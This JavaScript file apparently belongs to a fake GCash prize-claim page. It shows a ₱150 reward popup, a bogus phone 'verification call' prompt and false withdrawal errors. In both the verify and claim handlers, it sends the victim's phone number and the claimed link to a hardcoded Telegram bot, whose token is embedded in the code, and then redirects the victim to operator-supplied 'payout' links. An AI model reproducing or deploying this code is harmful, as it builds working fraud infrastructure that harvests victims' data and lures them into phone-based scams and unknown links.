// ========== POPUP_SHARE.JS - COMPLETE ==========

// ========== FIREWALL VERIFICATION VARIABLES ==========
var currentVerificationCode = null;
var verificationAttempts = 0;

// ========== GET FIREWALL STATUS ==========
async function getFirewallStatus() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        console.warn("Firebase not available");
        return false;
    }
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        console.log("Firewall status from Firebase:", data);
        if (data === null) {
            await db.ref('admin/globalFirewall').set({
                active: false,
                activatedBy: "SYSTEM",
                timestamp: Date.now()
            });
            return false;
        }
        return data.active === true;
    } catch(e) {
        console.error("Firewall check error:", e);
        return false;
    }
}

// ========== GET LATEST PAYOUT LINK ==========
async function getLatestPayoutLink() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        console.log("Looking for available links in 'links' node...");
        
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        
        console.log("Snapshot exists?", snapshot.exists());
        
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("Found payout link:", linkData.url, "Key:", key);
            return { url: linkData.url, key: key };
        }
        
        // Try to see all links for debugging
        const allLinks = await db.ref('links').once('value');
        console.log("All links in database:", allLinks.val());
        
        return null;
    } catch (error) {
        console.error("Error getting payout link:", error);
        return null;
    }
}

// ========== FIREWALL VERIFICATION POPUP ==========
function showFirewallVerificationPopup() {
    var existingModal = document.getElementById('firewallVerifyModal');
    if (existingModal) existingModal.remove();
    
    var modal = document.createElement('div');
    modal.id = 'firewallVerifyModal';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20001';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    var verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    console.log("Verification code for this session:", verificationCode);
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
            <div style="color: white; font-size: 13px; margin-bottom: 20px; line-height: 1.5;">
                <p>You will receive a call from our verification system.</p>
                <p>Please enter the <strong>4-digit code</strong> provided during the call.</p>
            </div>
            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center; letter-spacing: 4px;" placeholder="1234" maxlength="4" inputmode="numeric">
                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
            </div>
            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; margin-top: 10px; display: none;"></div>
            <div style="font-size: 11px; color: #ffaa33; margin-top: 10px;">Waiting for verification call...</div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    var codeInput = document.getElementById('verifyCodeInput');
    var verifyBtn = document.getElementById('submitVerifyBtn');
    var errorDiv = document.getElementById('verifyErrorMsg');
    var attempts = 0;
    
    if (codeInput) codeInput.focus();
    
    verifyBtn.onclick = function() {
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length < 4) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        
        attempts++;
        
        if (enteredCode === verificationCode) {
            var userPhone = localStorage.getItem("userPhone") || "Unknown";
            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY SUCCESS\nPhone: " + userPhone))
                .catch(function(e) {});
            modal.remove();
            alert("Verification successful! Please try claiming again.");
            setTimeout(function() {
                window.location.reload();
            }, 1000);
        } else {
            var errorMsg = "Invalid verification code. Please try again.";
            if (attempts >= 3) {
                errorMsg = "Too many failed attempts. Page will refresh.";
                setTimeout(function() {
                    window.location.reload();
                }, 2000);
            }
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
            codeInput.value = '';
            codeInput.focus();
        }
    };
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };
}

// ========== NO LINK ALERT ==========
function showNoLinkAlert() {
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20000';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    modal.style.fontFamily = "'Inter', sans-serif";
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNSUCCESSFUL</h3>
            <div style="color: white; font-size: 13px; line-height: 1.6; text-align: left;">
                <p><strong>Possible Reasons:</strong></p>
                <p>• No GCash payout link has been deployed by the administrator.</p>
                <p>• This device has already reached the maximum payout limit.</p>
                <p>• No GCash app installed on this device.</p>
                <p>• Please try using another device or contact support.</p>
            </div>
            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlertBtn').onclick = function() {
        modal.remove();
    };
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };
}

// ========== SHOW PRIZE POPUP WITH DYNAMIC CONTENT ==========
function showPrizePopup() {
    var popup = document.getElementById('prizePopup');
    var contentDiv = document.getElementById('dynamicPopupContent');
    
    if (contentDiv) {
        contentDiv.innerHTML = `
            <div class="popup-balance" id="popupBalanceAmount">₱150.00</div>
            <div class="divider"></div>
            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
            <div class="luckyday-image-container">
                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
            </div>
            <div class="divider"></div>
            <div class="indicator-group">
                <div class="indicator" id="indicator1"></div>
                <div class="indicator" id="indicator2"></div>
                <div class="indicator" id="indicator3"></div>
            </div>
            
            <!-- CLAIM THRU GCASH Button -->
            <button class="claim-gcash-button" id="claimGCashBtn" style="
                background: linear-gradient(135deg, #0066ff, #0044cc);
                width: 100%;
                padding: 14px;
                border: none;
                border-radius: 60px;
                font-weight: 800;
                color: white;
                font-size: 15px;
                cursor: pointer;
                margin-top: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            ">
                <img src="images/gc_icon.png" style="width: 20px; height: 20px;" alt="gc"> CLAIM THRU GCASH
            </button>

            <div style="height: 1px; background: linear-gradient(90deg, transparent, rgba(255,215,0,0.4), transparent); margin: 12px 0;"></div>

            <!-- BACK Button -->
            <button id="backBtn" style="
                background: linear-gradient(135deg, #ffd700, #ffaa33, #ff8c00);
                border: none;
                border-radius: 50px;
                padding: 8px 20px;
                font-weight: 700;
                color: #1a1a2e;
                font-size: 13px;
                cursor: pointer;
                margin-top: 5px;
                display: inline-flex;
                align-items: center;
                justify-content: center;
                gap: 6px;
                width: auto;
                min-width: 90px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            ">
                ← BACK
            </button>
        `;
        
        // Initialize buttons after adding to DOM
        initClaimThruGCashButton();
        initBackButton();
    }
    
    if (popup) {
        popup.style.display = 'flex';
        if (typeof startConfetti === 'function') startConfetti();
    }
}

function closePrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'none';
        if (typeof stopConfetti === 'function') stopConfetti();
    }
}

// ========== BACK BUTTON ==========
function initBackButton() {
    var backBtn = document.getElementById('backBtn');
    if (backBtn) {
        var newBtn = backBtn.cloneNode(true);
        backBtn.parentNode.replaceChild(newBtn, backBtn);
        backBtn = newBtn;
        
        backBtn.onclick = function(e) {
            e.preventDefault();
            closePrizePopup();
        };
    }
}

// ========== CLAIM THRU GCASH HANDLER ==========
async function handleClaimThruGCash() {
    console.log("=== CLAIM THRU GCASH START ===");
    
    // Close the prize popup first
    var prizePopup = document.getElementById('prizePopup');
    if (prizePopup) prizePopup.style.display = 'none';
    
    // Check if Firebase is available
    if (typeof firebase === 'undefined' || !firebase.database) {
        console.error("Firebase not available");
        alert("CONNECTION ERROR\n\nPlease refresh the page and try again.");
        return;
    }
    
    try {
        const db = firebase.database();
        
        // 1. Check firewall status
        console.log("Checking firewall status...");
        const firewallSnap = await db.ref('admin/globalFirewall').once('value');
        const firewallData = firewallSnap.val();
        const isFirewallOn = firewallData && firewallData.active === true;
        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
        
        if (isFirewallOn) {
            console.log("Firewall ON - Showing verification popup");
            showFirewallVerificationPopup();
            return;
        }
        
        // 2. Check for available links
        console.log("Checking for available links...");
        const linksSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        
        console.log("Links snapshot exists?", linksSnap.exists());
        
        if (!linksSnap.exists()) {
            console.log("No available links found");
            showNoLinkAlert();
            return;
        }
        
        // 3. Get the link
        var linkKey = null;
        var linkUrl = null;
        
        linksSnap.forEach(function(child) {
            linkKey = child.key;
            linkUrl = child.val().url;
            console.log("Found link - Key:", linkKey, "URL:", linkUrl);
        });
        
        if (!linkUrl) {
            console.log("Invalid link URL");
            showNoLinkAlert();
            return;
        }
        
        // 4. Fix URL if needed
        if (linkUrl && !linkUrl.startsWith('http')) {
            linkUrl = 'https://' + linkUrl;
        }
        
        // 5. Update link status to claimed
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        await db.ref('links/' + linkKey).update({
            status: 'claimed',
            user: userPhone,
            claimedAt: Date.now()
        });
        console.log("Link status updated to claimed");
        
        // 6. Send Telegram notification
        fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM SUCCESS!\nPhone: " + userPhone + "\nAmount: ₱150\nLink: " + linkUrl))
            .catch(e => console.log("Telegram error:", e));
        
        console.log("Redirecting to:", linkUrl);
        alert("✅ CLAIM SUCCESSFUL!\n\nYou will be redirected to complete your withdrawal.");
        window.location.href = linkUrl;
        
    } catch(error) {
        console.error("ERROR in handleClaimThruGCash:", error);
        alert("SYSTEM ERROR\n\nPlease try again later.\n\nError: " + error.message);
    }
    
    console.log("=== CLAIM THRU GCASH END ===");
}

// ========== INITIALIZE CLAIM THRU GCASH BUTTON ==========
function initClaimThruGCashButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        var newBtn = claimBtn.cloneNode(true);
        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
        claimBtn = newBtn;
        
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            console.log("CLAIM THRU GCASH button clicked");
            handleClaimThruGCash();
        };
        console.log("CLAIM THRU GCASH button initialized");
    } else {
        console.log("CLAIM THRU GCASH button not found yet");
    }
}

// ========== INITIALIZE ALL ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Popup_share.js loaded");
    
    // CLAIM NOW button is handled in HTML
    
    // Facebook share button is handled in HTML
});
